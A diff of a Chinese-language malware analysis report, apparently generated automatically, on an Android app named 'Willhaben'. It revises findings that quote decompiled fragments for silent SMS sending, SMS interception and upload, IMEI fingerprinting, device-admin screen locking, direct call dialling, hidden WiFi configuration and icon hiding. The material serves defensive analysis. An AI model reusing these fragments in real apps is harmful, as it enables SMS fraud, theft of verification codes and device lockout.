@@ -6,7 +6,7 @@
     "应用名": "Willhaben",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 328.3
+    "分析耗时(秒)": 457.7
   },
   "行为列表": [
     {
@@ -67,7 +67,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, broadcast, broadcast2);",
           "malicious_code_snippet_context": "                      }\n                  }\n              }, new IntentFilter(\"SMS_DELIVERED\"));\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, broadcast, broadcast2);\n          } catch (Exception e) {\n              Toast.makeText(context, e.getMessage().toString(), 1).show();\n              Logger.e(LOG_TAG, e.getMessage());",
-          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互或确认。同时注册了 SMS_DELIVERED 广播监听短信投递状态，通过回调 MessStatusInterface.isSmsDelivered() 处理发送结果。在已确认的恶意样本中，此行为通常用于短信欺诈（如发送付费短信扣取用户费用）或向C2服务器泄露数据。",
+          "behavior_description": "该代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互或系统UI确认。目标号码(str)和短信内容(str2)作为参数传入，同时注册了 SMS_DELIVERED 广播接收器监听短信送达状态（getResultCode() 判断 -1 成功/0 失败并回调 messStatusInterface.isSmsDelivered()），形成完整的静默短信发送-状态回执闭环。这是典型的短信欺诈行为，恶意软件可在用户不知情的情况下向增值服务号码发送扣费短信或向通讯录联系人发送诈骗/传播短信，直接造成用户话费损失。类路径 com.leretes.tls.BmndTls 为混淆后的自定义代码，非知名第三方库，且该样本已确认为恶意样本，结合静默发送API判定为恶意行为。",
           "glm_analyzed": true
         },
         {
@@ -76,9 +76,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "Object[] objArr = (Object[]) bundle.get(\"pdus\");\nfor (Object obj : objArr) {\n    SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n    sendSRecRequest(context, createFromPdu.getDisplayOriginatingAddress(), createFromPdu.getDisplayMessageBody(), 0L);\n    abortBroadcast();\n}",
-          "malicious_code_snippet_context": "      }\n  \n      private void sRec(Context context, Bundle bundle) throws Exception {\n>>>         Object[] objArr = (Object[]) bundle.get(\"pdus\");\n>>>         if (objArr != null) {\n>>>             for (Object obj : objArr) {\n>>>                 SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n>>>                 sendSRecRequest(context, createFromPdu.getDisplayOriginatingAddress(), createFromPdu.getDisplayMessageBody(), 0L);\n>>>                 abortBroadcast();\n              }\n          }\n      }",
-          "behavior_description": "代码从Bundle中提取短信PDU数据，解析出发件人地址和短信内容后，先通过sendSRecRequest将短信内容上传到远程服务器，再调用abortBroadcast()中止短信广播，使系统短信应用和其他应用无法收到该短信，实现短信拦截与窃取。数据流向：bundle.get(\"pdus\")获取收到的短信 → abortBroadcast()阻止短信送达用户，同时sendSRecRequest上传短信内容到远端服务器。",
+          "malicious_code_snippet": "Object[] objArr = (Object[]) bundle.get(\"pdus\");\nfor (Object obj : objArr) {\n    SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n    sendSRecRequest(context, smsMessageCreateFromPdu.getDisplayOriginatingAddress(), smsMessageCreateFromPdu.getDisplayMessageBody(), 0L);\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "      }\n  \n      private void sRec(Context context, Bundle bundle) throws Exception {\n>>>         Object[] objArr = (Object[]) bundle.get(\"pdus\");\n>>>         if (objArr != null) {\n>>>             for (Object obj : objArr) {\n>>>                 SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n>>>                 sendSRecRequest(context, smsMessageCreateFromPdu.getDisplayOriginatingAddress(), smsMessageCreateFromPdu.getDisplayMessageBody(), 0L);\n>>>                 abortBroadcast();\n              }\n          }\n      }",
+          "behavior_description": "该广播接收器（SRev）在收到短信广播时，从 Bundle 中提取 pdus 数据并解析为 SmsMessage，获取发件人地址和短信正文，随后通过 sendSRecRequest 将拦截到的短信内容（发件号码+正文）经 HTTP 请求（DAP.doRequestDelayed）上传到远程服务器，同时调用 abortBroadcast() 终止广播，使短信无法到达系统短信应用和用户界面。数据流向：短信广播 PDU（source）→ 解析出发件人与内容 → 网络外传至远程服务器 + abortBroadcast 隐藏短信（sink）。这是典型的短信拦截木马行为，可窃取验证码、银行短信并隐藏扣费确认短信，直接造成用户财产损失。",
           "glm_analyzed": true
         }
       ]
@@ -106,9 +106,9 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\nstr = telephonyManager.getImei();\nstr = telephonyManager.getDeviceId();\nreturn (str == null || str.length() == 0) ? Settings.Secure.getString(context.getContentResolver(), \"android_id\") : str;",
-          "malicious_code_snippet_context": "      }\n  \n      public static String getPhoneOperator(Context context) {\n>>>         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>         return telephonyManager != null ? telephonyManager.getNetworkOperatorName() : BuildConfig.FLAVOR;\n>>>     }\n>>> \n      public static String getPhoneNumber(Context context) {\n          TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n          if (Build.VERSION.SDK_INT >= 23) {",
-          "behavior_description": "通过TelephonyManager获取设备IMEI（Android 8.0以上使用getImei()，以下使用getDeviceId()），若获取失败则回退使用Settings.Secure获取Android ID，用于生成设备唯一指纹。",
+          "malicious_code_snippet": "deviceId = telephonyManager.getImei(); deviceId = telephonyManager.getDeviceId(); return (deviceId == null || deviceId.length() == 0) ? Settings.Secure.getString(context.getContentResolver(), \"android_id\") : deviceId;",
+          "malicious_code_snippet_context": "deviceId = telephonyManager.getImei(); deviceId = telephonyManager.getDeviceId(); return (deviceId == null || deviceId.length() == 0) ? Settings.Secure.getString(context.getContentResolver(), \"android_id\") : deviceId;",
+          "behavior_description": "该方法通过 TelephonyManager 采集设备唯一标识：Android 8.0 及以上调用 getImei()，低版本调用 getDeviceId() 获取 IMEI；若获取失败则回退读取 Settings.Secure 中的 ANDROID_ID 作为备用设备指纹。数据流向：TelephonyManager.getImei()/getDeviceId() 或 ANDROID_ID（source）→ 聚合返回设备唯一标识符（sink）。该代码位于混淆包名 com.leretes.tls 下，无正常业务场景说明，属于典型的设备指纹采集/过度收集设备隐私行为，在已确认的恶意样本中通常用于唯一标识受害者设备以便后续追踪或数据上报。",
           "glm_analyzed": true
         }
       ]
@@ -141,7 +141,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(\"device_policy\");\nComponentName componentName = new ComponentName(this, (Class<?>) AdReceiver.class);\nif (!devicePolicyManager.isAdminActive(componentName)) {\n    IntTls.startoAdminAction(componentName, this);\n} else {\n    devicePolicyManager.lockNow();\n}",
           "malicious_code_snippet_context": "  \n      private void setAdmin() {\n          try {\n>>>             DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>             if (devicePolicyManager != null) {\n>>>                 ComponentName componentName = new ComponentName(this, (Class<?>) AdReceiver.class);\n>>>                 if (!devicePolicyManager.isAdminActive(componentName)) {\n>>>                     IntTls.startoAdminAction(componentName, this);\n>>>                 } else {\n>>>                     devicePolicyManager.lockNow();\n                  }\n              }\n          } catch (Exception e) {",
-          "behavior_description": "代码通过DevicePolicyManager检查是否已获得设备管理员权限，若未获得则请求管理员权限，一旦获得管理员权限立即调用lockNow()锁定设备屏幕，这是典型的勒索软件设备锁定行为，导致用户无法正常使用设备",
+          "behavior_description": "该代码通过 getSystemService(\"device_policy\") 获取 DevicePolicyManager，并以 AdReceiver 作为设备管理员组件：若管理员权限尚未激活，则通过 IntTls.startoAdminAction 诱导用户授予设备管理员权限（防止锁屏后轻易卸载）；若权限已激活，则直接调用 devicePolicyManager.lockNow() 立即强制锁定设备屏幕。数据流向：设备管理员激活状态检查(isAdminActive) → lockNow() 强制锁屏。这是典型的勒索软件锁屏行为，伪装在名为 AdRequestDialog 的广告类中，先骗取设备管理员权限再锁死屏幕，使用户无法正常使用设备，通常配合勒索界面索要赎金。",
           "glm_analyzed": true
         }
       ]
@@ -174,9 +174,9 @@
           "malicious_behavior": "call_operations",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\ncontext.startActivity(intent);",
-          "malicious_code_snippet_context": "              if (str.contains(\"#\")) {\n                  str = str.replaceAll(\"#\", Uri.encode(\"#\"));\n              }\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.setFlags(268435456);\n>>>             context.startActivity(intent);\n          } catch (Exception e) {\n              Logger.e(LOG_TAG, e.toString());\n          }",
-          "behavior_description": "代码接收外部传入的电话号码字符串，通过构造 Intent.ACTION_CALL 并传入 tel: URI，直接发起电话呼叫，无需用户在拨号界面二次确认，可能导致静默拨打高额费率号码或特定服务号码造成用户经济损失。",
+          "malicious_code_snippet": "if (str.contains(\"#\")) {\n    str = str.replaceAll(\"#\", Uri.encode(\"#\"));\n}\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public static void callNumber(Context context, String str) {\n          try {\n>>>             if (str.contains(\"#\")) {\n>>>                 str = str.replaceAll(\"#\", Uri.encode(\"#\"));\n>>>             }\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.setFlags(268435456);\n>>>             context.startActivity(intent);\n          } catch (Exception e) {\n              Logger.e(LOG_TAG, e.toString());\n          }",
+          "behavior_description": "该方法接收外部传入的电话号码字符串，若包含 # 字符则进行 Uri 编码（以支持 USSD 码或特殊服务号码拨号），随后构造 ACTION_CALL Intent 并直接调用 startActivity 拨打该号码。数据流向：外部可控的号码字符串（方法参数 str，可能来自 C2 服务器指令、短信或硬编码配置）→ 通过 ACTION_CALL 直接发起电话呼叫（无需用户确认，区别于仅调起拨号界面的 ACTION_DIAL）。在恶意样本中，这是典型的静默拨打高额付费号码/USSD 服务进行资费吸费的恶意行为，可直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -199,13 +199,13 @@
       "恶意代码": [
         {
           "class_path": "Lcom\\leretes\\tls\\WTFTls;",
-          "method_signature": "?(?)",
+          "method_signature": "if(wifiManager != null)",
           "malicious_behavior": "wifi_password_theft",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "private static final String PSSWD = \"\\\"password\\\"\";\n    private static final String SS_ID = \"\\\"SSIDName\\\"\";\n\n    public static void setWtf(Context context) {\n        try {",
-          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class WTFTls {\n>>>     private static final String PSSWD = \"\\\"password\\\"\";\n>>>     private static final String SS_ID = \"\\\"SSIDName\\\"\";\n>>> \n>>>     public static void setWtf(Context context) {\n>>>         try {\n              WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(\"wifi\");\n              if (wifiManager != null) {\n                  WifiConfiguration wifiConfiguration = new WifiConfiguration();",
-          "behavior_description": "该类导入了 WifiConfiguration 和 WifiManager，定义了用于匹配 WiFi 配置中 SSID 和密码字段的常量（SS_ID、PSSWD），setWtf 方法接收 Context 参数以获取 WifiManager 实例，意图通过 getConfiguredNetworks() 读取设备保存的 WiFi 配置信息（包含 SSID 和预共享密钥/密码），属于 WiFi 密码窃取行为。数据来源为 WifiManager.getConfiguredNetworks() 读取的 WiFi 配置列表，危险操作为提取 WiFi 凭据用于后续外传。",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(\"wifi\");\nif (wifiManager != null) {\n    WifiConfiguration wifiConfiguration = new WifiConfiguration();\n    wifiConfiguration.SSID = SS_ID;\n    wifiConfiguration.preSharedKey = PSSWD;\n    wifiConfiguration.hiddenSSID = true;\n    wifiConfiguration.status = 2;\n    wifiConfiguration.allowedKeyManagement.set(1);\n    boolean zIsWifiEnabled = wifiManager.isWifiEnabled();",
+          "malicious_code_snippet_context": "  \n      public static void setWtf(Context context) {\n          try {\n>>>             WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(\"wifi\");\n>>>             if (wifiManager != null) {\n>>>                 WifiConfiguration wifiConfiguration = new WifiConfiguration();\n>>>                 wifiConfiguration.SSID = SS_ID;\n>>>                 wifiConfiguration.preSharedKey = PSSWD;\n>>>                 boolean z = true;\n>>>                 wifiConfiguration.hiddenSSID = true;\n>>>                 wifiConfiguration.status = 2;\n>>>                 wifiConfiguration.allowedGroupCiphers.set(2);\n                  wifiConfiguration.allowedGroupCiphers.set(3);\n                  wifiConfiguration.allowedKeyManagement.set(1);\n                  wifiConfiguration.allowedPairwiseCiphers.set(1);",
+          "behavior_description": "该代码通过WifiManager创建一个新的WiFi网络配置，使用硬编码的SSID和密码，并设置为隐藏网络。代码配置了WPA2加密参数，并检查WiFi是否启用。这不是窃取已保存的WiFi密码（没有调用getConfiguredNetworks()读取已有密码），而是在设备上写入/创建新的WiFi配置，可能用于强制设备连接到攻击者控制的接入点进行流量劫持。数据流向：硬编码常量→WifiConfiguration对象→WifiManager（潜在的网络配置篡改）",
           "glm_analyzed": true
         }
       ]
@@ -231,7 +231,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".MainActivity\"), 2, 1);",
           "malicious_code_snippet_context": "  \n      private void hideApp() {\n          String packageName = getPackageName();\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".MainActivity\"), 2, 1);\n      }\n  }",
-          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从启动器中隐藏，用户无法在桌面上看到该应用图标。数据流向：getPackageName()获取包名 → 构造ComponentName → setComponentEnabledSetting()禁用主Activity组件，实现图标隐藏。这是恶意软件常用的持久化与隐蔽手段，使恶意应用在后台运行而不被用户察觉和卸载。",
+          "behavior_description": "该代码通过 PackageManager.setComponentEnabledSetting() 将应用自身的 MainActivity 组件设置为禁用状态（参数 2 即 COMPONENT_ENABLED_STATE_DISABLED，参数 1 为 DONT_KILL_APP）。由于启动器图标依赖 MainActivity 的 LAUNCHER intent-filter，禁用该组件后应用图标会从桌面消失，用户无法察觉应用存在也难以卸载。数据流向：getPackageName() 获取自身包名 → 构造 ComponentName 指向自身 MainActivity → setComponentEnabledSetting() 静默禁用组件实现图标隐藏。结合同类中 setDefaultSmsCl() 操作默认短信应用的代码，这是典型的短信类木马安装后自我隐藏以躲避用户查杀的隐蔽驻留手法。",
           "glm_analyzed": true
         }
       ]
@@ -244,7 +244,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
